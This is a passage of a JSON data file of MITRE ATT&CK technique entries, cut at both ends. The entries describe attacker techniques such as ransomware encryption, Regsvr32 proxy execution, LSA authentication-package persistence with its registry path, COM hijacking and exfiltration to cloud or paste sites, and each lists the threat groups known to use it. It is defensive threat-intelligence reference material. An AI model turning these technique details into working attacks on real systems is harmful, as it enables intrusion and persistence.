Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.^[[1]](https://securelist.com/lazarus-threatneedle/100803/)^  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1486":{"id":"T1486","name":"Data Encrypted for Impact","description":"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.^[[1]](https://www.us-cert.gov/ncas/alerts/TA16-091A)^^[[2]](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html)^^[[3]](https://www.us-cert.gov/ncas/alerts/TA17-181A)^^[[4]](https://www.us-cert.gov/ncas/alerts/AA18-337A)^\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.^[[5]](https://www.carbonblack.com/blog/tau-threat-discovery-conti-ransomware/)^ In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.^[[3]](https://www.us-cert.gov/ncas/alerts/TA17-181A)^ \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).^[[2]](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html)^^[[3]](https://www.us-cert.gov/ncas/alerts/TA17-181A)^ Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").^[[6]](https://digital.nhs.uk/cyber-alerts/2020/cc-3681#summary)^\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.^[[7]](https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/)^","platforms":["Linux","macOS","Windows","IaaS"],"tactics":["Impact"],"campaigns":["C0018","C0015"],"groups":["APT38","Magic Hound","FIN7","Sandworm Team","Indrik Spider","APT41","TA505","FIN8"]},"T1553":{"id":"T1553","name":"Subvert Trust Controls","description":"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.\n\nAdversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [Modify Registry](https://attack.mitre.org/techniques/T1112) in support of subverting these controls.^[[1]](https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf)^ Adversaries may also create or steal code signing certificates to acquire trust on target systems.^[[2]](https://securelist.com/why-you-shouldnt-completely-trust-files-signed-with-digital-certificates/68593/)^^[[3]](http://www.symantec.com/connect/blogs/how-attackers-steal-private-keys-digital-certificates)^ ","platforms":["Windows","macOS","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["Axiom"]},"T1548.004":{"id":"T1548.004","name":"Elevated Execution with Prompt","description":"Adversaries may leverage the `AuthorizationExecuteWithPrivileges` API to escalate privileges by prompting the user for credentials.^[[1]](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)^ The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse `AuthorizationExecuteWithPrivileges` to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.^[[2]](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8)^^[[3]](https://blogs.vmware.com/security/2020/02/vmware-carbon-black-tau-threat-analysis-shlayer-macos.html)^^[[4]](https://objective-see.com/blog/blog_0x2A.html)^ This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.^[[2]](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8)^^[[3]](https://blogs.vmware.com/security/2020/02/vmware-carbon-black-tau-threat-analysis-shlayer-macos.html)^ This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.^[[2]](https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken?slide=8)^","platforms":["macOS"],"tactics":["Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1592.003":{"id":"T1592.003","name":"Firmware","description":"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).^[[1]](https://arstechnica.com/information-technology/2020/08/intel-is-investigating-the-leak-of-20gb-of-its-source-code-and-private-data/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1573":{"id":"T1573","name":"Encrypted Channel","description":"Adversaries may employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Tropic Trooper","Magic Hound","BITTER","APT29"]},"T1547.002":{"id":"T1547.002","name":"Authentication Package","description":"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.^[[1]](https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx)^\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\` with the key value of `\"Authentication Packages\"=&lt;target binary&gt;`. The binary will then be executed by the system when the authentication packages are loaded.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1218.010":{"id":"T1218.010","name":"Regsvr32","description":"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. ^[[1]](https://support.microsoft.com/en-us/kb/249873)^\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. ^[[2]](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)^ This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments. ^[[3]](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/)^ ^[[4]](https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html)^\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). ^[[3]](https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job","C0015"],"groups":["TA551","Deep Panda","Cobalt Group","Blue Mockingbird","Leviathan","Kimsuky","Inception","WIRTE","APT32","APT19","Lazarus Group"]},"T1567.003":{"id":"T1567.003","name":"Exfiltration to Text Storage Sites","description":"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as `pastebin[.]com`, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., [Stage Capabilities](https://attack.mitre.org/techniques/T1608)), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.^[[1]](https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it)^\n\n**Note:** This is distinct from [Exfiltration to Code Repository](https://attack.mitre.org/techniques/T1567/001), which highlight access to code repositories via APIs.","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":[],"groups":[]},"T1592.002":{"id":"T1592.002","name":"Software","description":"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.^[[1]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^ Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Magic Hound","Sandworm Team","Andariel"]},"T1056":{"id":"T1056","name":"Input Capture","description":"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).","platforms":["Linux","macOS","Windows","Network"],"tactics":["Collection","Credential Access"],"campaigns":[],"groups":["APT39","APT34"]},"T1566.004":{"id":"T1566.004","name":"Spearphishing Voice","description":"Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,^[[1]](https://blog.sygnia.co/luna-moth-false-subscription-scams)^^[[2]](https://www.cisa.gov/uscert/ncas/alerts/aa23-025a)^ or install adversary-accessible remote management tools ([Remote Access Software](https://attack.mitre.org/techniques/T1219)) onto their computer.^[[3]](https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/)^\n\nAdversaries may also combine voice phishing with [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick users into divulging MFA credentials or accepting authentication prompts.^[[4]](https://www.proofpoint.com/us/threat-reference/vishing)^","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Initial Access"],"campaigns":["C0027"],"groups":[]},"T1587.004":{"id":"T1587.004","name":"Exploits","description":"Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.^[[1]](https://www.nytimes.com/2011/01/16/world/middleeast/16stuxnet.html)^ Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.^[[2]](https://www.irongeek.com/i.php?page=videos/bsidescharm2017/bsidescharm-2017-t111-microsoft-patch-analysis-for-exploitation-stephen-sims)^\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1593.001":{"id":"T1593.001","name":"Social Media","description":"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).^[[1]](https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e)^ Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["Operation Dream Job"],"groups":["Kimsuky","EXOTIC LILY","Lazarus Group"]},"T1546.015":{"id":"T1546.015","name":"Component Object Model Hijacking","description":"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.^[[1]](https://msdn.microsoft.com/library/ms694363.aspx)^  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.^[[2]](https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence)^ An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":["APT28"]},"T1589.001":{"id":"T1589.001","name":"Credentials","description":"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.^[[1]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^ Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).^[[2]](https://www.theregister.com/2017/09/26/deloitte_leak_github_and_google/)^^[[3]](https://www.theregister.com/2015/02/28/uber_subpoenas_github_for_hacker_details/)^^[[4]](https://labs.detectify.com/2016/04/28/slack-bot-token-leakage-exposing-business-critical-information/)^^[[5]](https://www.forbes.com/sites/runasandvik/2014/01/14/attackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency/#242c479d3196)^^[[6]](https://github.com/dxa4481/truffleHog)^^[[7]](https://github.com/michenriksen/gitrob)^^[[8]](https://www.cnet.com/news/massive-breach-leaks-773-million-emails-21-million-passwords/)^ Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).^[[9]](https://sec.okta.com/scatterswine)^\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). ","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["SolarWinds Compromise","C0027"],"groups":["APT28","Magic Hound","Leviathan","LAPSUS$","Chimera","APT29"]},"T1195.002":{"id":"T1195.002","name":"Compromise Software Supply Chain","description":"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.^[[1]](https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities)^^[[2]](https://www.commandfive.com/papers/C5_APT_SKHack.pdf)^  ","platforms":["Linux","macOS","Windows"],"tactics":["Initial Access"],"campaigns":["SolarWinds Compromise"],"groups":["APT41","Cobalt Group","GOLD SOUTHFIELD","Sandworm Team","Dragonfly","Threat Group-3390","FIN7","UNC2452","APT29","Gelsemium"]},"T1036.003":{"id":"T1036.003","name":"Rename System Utilities","description":"Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing. ^[[1]](https://lolbas-project.github.io/)^ It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename `rundll32.exe`). ^[[2]](https://www.elastic.co/blog/how-hunt-masquerade-ball)^ An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. ^[[3]](https://www.f-secure.com/documents/996508/1030745/CozyDuke)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["menuPass","Lazarus Group","APT32","GALLIUM"]},"T1102.002":{"id":"T1102.002","name":"Bidirectional Communication","description":"Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Ghost"],"groups":["Kimsuky","POLONIUM","APT37","Lazarus Group","APT12","APT39","Magic Hound","Turla","HEXANE","Carbanak","FIN7","Sandworm Team","APT28","MuddyWater","ZIRCONIUM","APT29"]},"T1203":{"id":"T1203","name":"Exploitation for Client Execution","description":"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","platforms":["Linux","Windows","macOS"],"tactics":["Execution"],"campaigns":["Frankenstein","Operation Dust Storm"],"groups":["Sidewinder","APT28","Threat Group-3390","Sandworm Team","Dragonfly","Andariel","The White Company","EXOTIC LILY","Lazarus Group","Ember Bear","APT29","BlackTech","Confucius","Patchwork","APT12","Axiom","Higaisa","Cobalt Group","Leviathan","APT37","TA459","Mustang Panda","APT3","BRONZE BUTLER","Transparent Tribe","Tropic Trooper","Tonto Team","Aoqin Dragon","Inception","APT41","BITTER","Elderwood","Darkhotel","APT32","admin@338","APT33","MuddyWater","Frankenstein"]},"T1595.003":{"id":"T1595.003","name":"Wordlist Scanning","description":"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to [Brute Force](https://attack.mitre.org/techniques/T1110), its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591), or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).\n\nFor example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.^[[1]](https://www.clearskysec.com/wp-content/uploads/2021/01/Lebanese-Cedar-APT.pdf)^ This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [Brute Force](https://attack.mitre.org/techniques/T1110)).  \n\nAs cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.^[[2]](https://github.com/clarketm/s3recon)^^[[3]](https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/)^ Once storage objects are discovered, adversaries may leverage [Data from Cloud Storage](https://attack.mitre.org/techniques/T1530) to access valuable information that can be exfiltrated or used to escalate privileges and move laterally. ","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":["Volatile Cedar"]},"T1562.011":{"id":"T1562.011","name":"Spoof Security Alerting","description":"Adversaries may spoof security alerting from tools, presenting false evidence to impair defenders’ awareness of malicious activity.^[[1]](https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/)^ Messages produced by defensive tools contain information about potential security events as well as the functioning status of security software and the system. Security reporting messages are important for monitoring the normal operation of a system and identifying important events that can signal a security incident.\n\nRather than or in addition to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), an adversary can spoof positive affirmations that security tools are continuing to function even after legitimate security tools have been disabled (e.g., [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)). An adversary can also present a “healthy” system status even after infection. This can be abused to enable further malicious activity by delaying defender responses.\n\nFor example, adversaries may show a fake Windows Security GUI and tray icon with a “healthy” system status after Windows Defender and other system tools have been disabled.^[[1]](https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/)^","platforms":["Windows","macOS","Linux"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1137.004":{"id":"T1137.004","name":"Outlook Home Page","description":"Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.^[[1]](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)^\n\nOnce malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.^[[1]](https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/)^\n","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":["OilRig"]},"T1573.002":{"id":"T1573.002","name":"Asymmetric Cryptography","description":"Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver’s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["Operation Wocao","C0021"],"groups":["TA2541","Tropic Trooper","OilRig","Cobalt Group","FIN6","FIN8","Operation Wocao"]},"T1567.002":{"id":"T1567.002","name":"Exfiltration to Cloud Storage","description":"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. ","platforms":["Linux","macOS","Windows"],"tactics":["Exfiltration"],"campaigns":["C0015","Operation Dream Job"],"groups":["Leviathan","LuminousMoth","Kimsuky","Threat Group-3390","Confucius","POLONIUM","HEXANE","Wizard Spider","Turla","HAFNIUM","Earth Lusca","ZIRCONIUM","Chimera","FIN7","Lazarus Group"]},"T1570":{"id":"T1570","name":"Lateral Tool Transfer","description":"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).^[[1]](https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/)^\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.^[[2]](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)^","platforms":["Linux","macOS","Windows"],"tactics":["Lateral Movement"],"campaigns":["C0018","2016 Ukraine Electric Power Attack","Operation Wocao","2015 Ukraine Electric Power Attack","C0015"],"groups":["APT32","Aoqin Dragon","FIN10","Volt Typhoon","Wizard Spider","Turla","Chimera","GALLIUM","Magic Hound","Sandworm Team","Operation Wocao"]},"T1574.009":{"id":"T1574.009","name":"Path Interception by Unquoted 